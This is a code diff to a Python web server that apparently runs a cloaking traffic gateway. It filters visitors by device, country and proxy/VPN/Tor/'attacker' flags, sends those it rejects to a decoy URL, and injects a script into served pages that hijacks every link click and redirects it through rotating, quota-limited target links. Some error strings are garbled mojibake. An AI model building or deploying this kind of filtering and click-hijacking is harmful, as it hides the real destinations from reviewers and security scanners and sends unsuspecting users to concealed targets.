@@ -24,7 +24,7 @@ from http import HTTPStatus
 from http.cookies import SimpleCookie
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
-from urllib.parse import parse_qs, urlparse
+from urllib.parse import parse_qs, unquote, urlparse
 
 
 ROOT = Path(__file__).resolve().parent
@@ -39,6 +39,7 @@ DOMAIN_RE = re.compile(
     re.IGNORECASE,
 )
 PORT_RE = re.compile(r"^[1-9][0-9]{1,4}$")
+REDIRECT_LIMIT_RE = re.compile(r"^[0-9]{1,9}$")
 
 SOURCE_CATALOG = {
     "landing-page": {
@@ -76,6 +77,36 @@ def verify_password(password: str, encoded: str) -> bool:
         return hmac.compare_digest(actual, base64.b64decode(expected))
     except (ValueError, TypeError):
         return False
+
+
+def normalize_redirect_links(value) -> list[dict]:
+    """Keep only explicit http(s) targets and normalize click limits."""
+    if isinstance(value, str):
+        items = []
+        for line in value.splitlines():
+            parts = [part.strip() for part in line.split("|", 1)]
+            if parts and parts[0]:
+                items.append({"url": parts[0], "limit": parts[1] if len(parts) > 1 else 0})
+    elif isinstance(value, list):
+        items = value
+    else:
+        items = []
+    result = []
+    for item in items[:50]:
+        if isinstance(item, str):
+            url, limit_value = item.strip(), 0
+        elif isinstance(item, dict):
+            url, limit_value = str(item.get("url", "")).strip(), item.get("limit", 0)
+        else:
+            continue
+        parsed = urlparse(url)
+        if parsed.scheme not in ("http", "https") or not parsed.netloc:
+            continue
+        limit_text = str(limit_value or "0").strip()
+        if not REDIRECT_LIMIT_RE.match(limit_text):
+            continue
+        result.append({"url": url, "limit": int(limit_text)})
+    return result
 
 
 class ClosingConnection(sqlite3.Connection):
@@ -131,6 +162,10 @@ class Store:
         CREATE TABLE IF NOT EXISTS settings (
           key TEXT PRIMARY KEY, value TEXT NOT NULL, updated_at TEXT NOT NULL
         );
+        CREATE TABLE IF NOT EXISTS redirect_link_stats (
+          link_index INTEGER PRIMARY KEY, clicks INTEGER NOT NULL DEFAULT 0,
+          updated_at TEXT NOT NULL
+        );
         """
         with self.connect() as db:
             db.executescript(schema)
@@ -156,6 +191,7 @@ class Store:
                 "blocked_ip_types": ["proxy", "anonymous", "relay"],
                 "blocked_threats": ["threat", "abuser", "attacker", "bogon", "tor"],
                 "redirect_url": "https://example.com/",
+                "redirect_links": [],
                 "frontend_entry": "index.html",
             }
             for key, value in defaults.items():
@@ -225,6 +261,12 @@ class Store:
             ).fetchall()
         return [dict(row) for row in rows]
 
+    def domain(self, host: str):
+        host = str(host or "").split(":", 1)[0].lower().strip().rstrip(".")
+        with self.connect() as db:
+            row = db.execute("SELECT * FROM domains WHERE domain=?", (host,)).fetchone()
+        return dict(row) if row else None
+
     def add_domain(self, domain: str, port: int, project_id=None, frontend_entry: str = "logo.gif"):
         with self.connect() as db:
             cursor = db.execute(
@@ -277,9 +319,11 @@ class Store:
             "ipregistry_api_key", "country_whitelist", "country_blacklist",
             "human_verification", "block_desktop", "block_ios", "block_android",
             "ipregistry_enabled", "blocked_ip_types", "blocked_threats", "redirect_url",
-            "frontend_entry",
+            "frontend_entry", "redirect_links",
         }
         with self.connect() as db:
+            if "redirect_links" in values:
+                db.execute("DELETE FROM redirect_link_stats")
             for key, value in values.items():
                 if key in allowed:
                     db.execute(
@@ -287,6 +331,30 @@ class Store:
                         "ON CONFLICT(key) DO UPDATE SET value=excluded.value,updated_at=excluded.updated_at",
                         (key, json.dumps(value), now_text()),
                     )
+
+    def next_redirect(self, links: list[dict]):
+        if not links:
+            return None
+        with self._lock:
+            with self.connect() as db:
+                selected = None
+                for index, item in enumerate(links):
+                    row = db.execute(
+                        "SELECT clicks FROM redirect_link_stats WHERE link_index=?", (index,)
+                    ).fetchone()
+                    clicks = row["clicks"] if row else 0
+                    if item["limit"] and clicks >= item["limit"]:
+                        continue
+                    selected = index
+                    break
+                if selected is None:
+                    selected = len(links) - 1
+                db.execute(
+                    "INSERT INTO redirect_link_stats(link_index,clicks,updated_at) VALUES(?,?,?) "
+                    "ON CONFLICT(link_index) DO UPDATE SET clicks=clicks+1,updated_at=excluded.updated_at",
+                    (selected, 1, now_text()),
+                )
+                return links[selected]["url"]
 
 
 STORE = Store(DB_PATH)
@@ -363,6 +431,15 @@ class Handler(BaseHTTPRequestHandler):
         parsed = urlparse(self.path)
         path = parsed.path
         query = parse_qs(parsed.query)
+        public_domain = STORE.domain(self.headers.get("Host", ""))
+        if public_domain:
+            if path in ("/track/visit", "/track/click"):
+                return self.track(path.rsplit("/", 1)[-1], query)
+            if path == "/guard/check":
+                return self.guard_check(query)
+            if path == "/__gateway/click":
+                return self.public_click()
+            return self.serve_public(path, public_domain)
         if path == "/api/auth/captcha":
             return self.get_captcha()
         if path == "/api/auth/me":
@@ -372,6 +449,8 @@ class Handler(BaseHTTPRequestHandler):
             return self.track(path.rsplit("/", 1)[-1], query)
         if path == "/guard/check":
             return self.guard_check(query)
+        if path == "/__gateway/click":
+            return self.public_click()
         if path.startswith("/api/"):
             if not self.require_auth():
                 return
@@ -416,6 +495,8 @@ class Handler(BaseHTTPRequestHandler):
             data = self.read_json()
         except (ValueError, json.JSONDecodeError) as exc:
             return self.json(400, {"error": str(exc) or "JSON 鏍煎紡閿欒"})
+        if STORE.domain(self.headers.get("Host", "")) and path not in ("/track/visit", "/track/click"):
+            return self.json(404, {"error": "request failed"})
         if path == "/api/auth/login":
             return self.login(data)
         if path in ("/track/visit", "/track/click"):
@@ -440,6 +521,9 @@ class Handler(BaseHTTPRequestHandler):
         if match:
             return self.update_project(int(match.group(1)))
         if path == "/api/settings":
+            data = dict(data)
+            if "redirect_links" in data:
+                data["redirect_links"] = normalize_redirect_links(data["redirect_links"])
             STORE.save_settings(data)
             return self.json(200, {"ok": True})
         return self.json(404, {"error": "request failed"})
@@ -497,53 +581,128 @@ class Handler(BaseHTTPRequestHandler):
         event_id = STORE.record_event(domain, event_type, self.client_ip(), self.headers.get("User-Agent", ""), str(path))
         return self.json(201, {"ok": True, "id": event_id}, {"Access-Control-Allow-Origin": "*"})
 
-    def guard_check(self, query):
+    def guard_decision(self):
         settings = STORE.get_settings()
         ua = self.headers.get("User-Agent", "").lower()
         reasons = []
-        if settings.get("block_desktop") and not re.search(r"android|iphone|ipad|mobile", ua):
+        is_android = "android" in ua
+        is_ios = bool(re.search(r"iphone|ipad|ipod", ua) or ("macintosh" in ua and "mobile" in ua))
+        is_mobile = is_android or is_ios or "mobile" in ua
+        if settings.get("block_desktop") and not is_mobile:
             reasons.append("desktop")
-        if settings.get("block_ios") and re.search(r"iphone|ipad|ipod", ua):
+        if settings.get("block_ios") and is_ios:
             reasons.append("ios")
-        if settings.get("block_android") and "android" in ua:
+        if settings.get("block_android") and is_android:
             reasons.append("android")
 
         registry = None
-        key = settings.get("ipregistry_api_key", "")
-        if settings.get("ipregistry_enabled") and key:
-            ip = self.client_ip()
-            url = f"https://api.ipregistry.co/{ip}?key={key}"
-            try:
-                request = urllib.request.Request(url, headers={"Accept": "application/json", "User-Agent": "GatewayConsole/1.0"})
-                with urllib.request.urlopen(request, timeout=6) as response:
-                    registry = json.loads(response.read().decode("utf-8"))
-                country = str(registry.get("location", {}).get("country", {}).get("code", "")).upper()
-                whitelist = {item for item in re.split(r"[\s,]+", settings.get("country_whitelist", "").upper()) if item}
-                blacklist = {item for item in re.split(r"[\s,]+", settings.get("country_blacklist", "").upper()) if item}
-                if whitelist and country not in whitelist:
-                    reasons.append("country_not_allowed")
-                if country and country in blacklist:
-                    reasons.append("country_blocked")
-                security = registry.get("security", {})
-                type_fields = {"proxy": "is_proxy", "vpn": "is_vpn", "anonymous": "is_anonymous", "relay": "is_relay", "cloud": "is_cloud_provider"}
-                threat_fields = {"threat": "is_threat", "abuser": "is_abuser", "attacker": "is_attacker", "bogon": "is_bogon", "tor": "is_tor"}
-                for selected, fields, prefix in (
-                    (settings.get("blocked_ip_types", []), type_fields, "network"),
-                    (settings.get("blocked_threats", []), threat_fields, "threat"),
-                ):
-                    for name in selected:
-                        if security.get(fields.get(name, "")):
-                            reasons.append(f"{prefix}:{name}")
-            except (urllib.error.URLError, TimeoutError, ValueError, json.JSONDecodeError) as exc:
-                return self.json(502, {"error": "IPRegistry 妫€娴嬫殏鏃朵笉鍙敤", "detail": str(exc)}, {"Access-Control-Allow-Origin": "*"})
+        registry_error = ""
+        key = str(settings.get("ipregistry_api_key", "")).strip()
+        if settings.get("ipregistry_enabled"):
+            if not key:
+                registry_error = "IPRegistry API Key 未配置"
+            else:
+                ip = self.client_ip()
+                url = f"https://api.ipregistry.co/{ip}?key={key}"
+                try:
+                    request = urllib.request.Request(url, headers={"Accept": "application/json", "User-Agent": "GatewayConsole/1.0"})
+                    with urllib.request.urlopen(request, timeout=6) as response:
+                        registry = json.loads(response.read().decode("utf-8"))
+                    country = str(registry.get("location", {}).get("country", {}).get("code", "")).upper()
+                    whitelist = {item for item in re.split(r"[\s,]+", str(settings.get("country_whitelist", "")).upper()) if item}
+                    blacklist = {item for item in re.split(r"[\s,]+", str(settings.get("country_blacklist", "")).upper()) if item}
+                    if whitelist and country not in whitelist:
+                        reasons.append("country_not_allowed")
+                    if country and country in blacklist:
+                        reasons.append("country_blocked")
+                    security = registry.get("security", {}) or {}
+                    type_fields = {"proxy": "is_proxy", "vpn": "is_vpn", "anonymous": "is_anonymous", "relay": "is_relay", "cloud": "is_cloud_provider"}
+                    threat_fields = {"threat": "is_threat", "abuser": "is_abuser", "attacker": "is_attacker", "bogon": "is_bogon", "tor": "is_tor"}
+                    for selected, fields, prefix in (
+                        (settings.get("blocked_ip_types", []), type_fields, "network"),
+                        (settings.get("blocked_threats", []), threat_fields, "threat"),
+                    ):
+                        for name in selected or []:
+                            if security.get(fields.get(name, "")) is True:
+                                reasons.append(f"{prefix}:{name}")
+                except (urllib.error.URLError, TimeoutError, ValueError, json.JSONDecodeError) as exc:
+                    registry_error = str(exc)
 
-        return self.json(200, {
-            "allowed": not reasons,
-            "reasons": reasons,
-            "redirect_url": settings.get("redirect_url", "") if reasons else "",
+        return {
+            "allowed": not reasons and not registry_error,
+            "reasons": reasons + (["ipregistry_unavailable"] if registry_error else []),
+            "redirect_url": str(settings.get("redirect_url", "")).strip(),
             "human_verification": bool(settings.get("human_verification")) and not reasons,
             "country": registry and registry.get("location", {}).get("country", {}).get("code", ""),
-        }, {"Access-Control-Allow-Origin": "*"})
+            "registry_error": registry_error,
+        }
+
+    def guard_check(self, query):
+        decision = self.guard_decision()
+        if decision["registry_error"]:
+            return self.json(502, {"error": "IPRegistry 检测暂时不可用", "detail": decision["registry_error"]}, {"Access-Control-Allow-Origin": "*"})
+        decision.pop("registry_error", None)
+        return self.json(200, decision, {"Access-Control-Allow-Origin": "*"})
+
+    def public_click(self):
+        domain = STORE.domain(self.headers.get("Host", ""))
+        if not domain:
+            return self.send_error(404)
+        settings = STORE.get_settings()
+        target = STORE.next_redirect(normalize_redirect_links(settings.get("redirect_links", [])))
+        if not target:
+            target = str(settings.get("redirect_url", "")).strip()
+        if not target or urlparse(target).scheme not in ("http", "https"):
+            return self.send_error(404)
+        STORE.record_event(domain["domain"], "click", self.client_ip(), self.headers.get("User-Agent", ""), target)
+        self.send_response(302)
+        self.send_header("Location", target)
+        self.send_header("Cache-Control", "no-store")
+        self.end_headers()
+
+    def serve_public(self, path: str, domain: dict):
+        project = STORE.project(domain.get("project_id")) if domain.get("project_id") else None
+        if not project or not project.get("local_path"):
+            return self.send_error(404)
+        root = Path(project["local_path"]).resolve()
+        raw_path = unquote(path or "/").lstrip("/")
+        entry = str(domain.get("frontend_entry") or "index.html").lstrip("/")
+        is_document = raw_path in ("", entry)
+        relative = entry if not raw_path else raw_path
+        file_path = (root / relative).resolve()
+        if (root not in file_path.parents and file_path != root) or not file_path.is_file():
+            return self.send_error(404)
+        if is_document:
+            STORE.record_event(domain["domain"], "visit", self.client_ip(), self.headers.get("User-Agent", ""), path or "/")
+            decision = self.guard_decision()
+            if not decision["allowed"]:
+                target = decision["redirect_url"]
+                if target and urlparse(target).scheme in ("http", "https"):
+                    self.send_response(302)
+                    self.send_header("Location", target)
+                    self.send_header("Cache-Control", "no-store")
+                    self.end_headers()
+                else:
+                    self.send_error(403)
+                return
+        try:
+            content = file_path.read_bytes()
+        except OSError:
+            return self.send_error(404)
+        content_type = "text/html" if is_document else (mimetypes.guess_type(str(file_path))[0] or "application/octet-stream")
+        if content_type.startswith("text/") or content_type in ("application/javascript", "application/json"):
+            content_type += "; charset=utf-8"
+        redirect_links = normalize_redirect_links(STORE.get_settings().get("redirect_links", [])) if is_document else []
+        closing_body = content.lower().rfind(b"</body>")
+        if redirect_links and closing_body >= 0:
+            script = b'<script>document.addEventListener("click",function(e){var a=e.target.closest&&e.target.closest("a");if(!a)return;e.preventDefault();window.location.assign("/__gateway/click")},true);</script>'
+            content = content[:closing_body] + script + content[closing_body:]
+        self.send_response(200)
+        self.send_header("Content-Type", content_type)
+        self.send_header("Content-Length", str(len(content)))
+        self.send_header("Cache-Control", "no-store" if is_document else "public, max-age=3600")
+        self.end_headers()
+        self.wfile.write(content)
 
     def create_domain(self, data):
         domain = str(data.get("domain", "")).lower().strip().rstrip(".")
